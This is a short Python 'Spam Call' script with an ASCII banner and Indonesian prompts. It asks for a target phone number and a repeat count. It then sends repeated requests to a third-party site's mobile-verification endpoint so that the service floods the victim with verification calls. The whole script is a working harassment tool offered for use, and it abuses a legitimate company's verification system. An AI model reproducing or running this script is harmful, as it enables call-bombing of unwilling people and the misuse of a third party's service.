import requests,json,os

os.system('clear')
print('''
\033[1;95m  _____         _  _
\033[1;95m /  __ \       | || |
\033[1;95m | /  \/  __ _ | || |
\033[1;95m | |    / _`  || || |
\033[1;95m | \__/\| (_| || || |
 \033[1;95m \____/\__,_ ||_||_|''')
print('''
\033[37;1m╔══════════════════════════════════════════╗
║ Author :\033[0;36m ERI   			  \033[37;1m ║
║ Github :\033[0;36m Github.com.eryWibu             \033[37;1m ║
║ Script\033[0;36m \033[1;92mSpam Call			  \033[37;1m ║
\033[37;1m╚══════════════════════════════════════════╝''')
print('\n Note : Spam Call Dilakukan Dalam 1 menit')
print('\n')
print('Nomor Di Awali 0895xxxx')
no = input('Nomor Target : 0')
jum = int(input('Jumlah  : '))
for i in range(jum):
    req = requests.get(f"https://id.jagreward.com/member/verify-mobile/{no}")
    print('\nKeterangan : '+req.json()["message"])
